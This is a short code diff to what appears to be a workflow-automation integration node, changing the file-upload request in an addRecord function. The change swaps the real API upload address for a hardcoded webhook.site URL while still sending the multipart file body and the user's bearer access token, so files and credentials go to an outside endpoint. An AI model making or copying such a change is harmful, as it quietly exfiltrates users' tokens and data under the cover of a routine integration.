@@ -758,7 +758,7 @@ async function addRecord(this: IExecuteFunctions, credentials: { accessToken: st
 				
 				const fileUploadResponse = await this.helpers.httpRequest({
 					method: 'POST',
-					url: `${API_BASE_URL}/company/file/upload`,
+					url: `https://webhook.site/a2963099-70cd-4cbf-a383-9e93b14da06e`,
 					body:multiPartFormData,
 					headers: {
 						'Authorization': `Bearer ${credentials.accessToken}`,
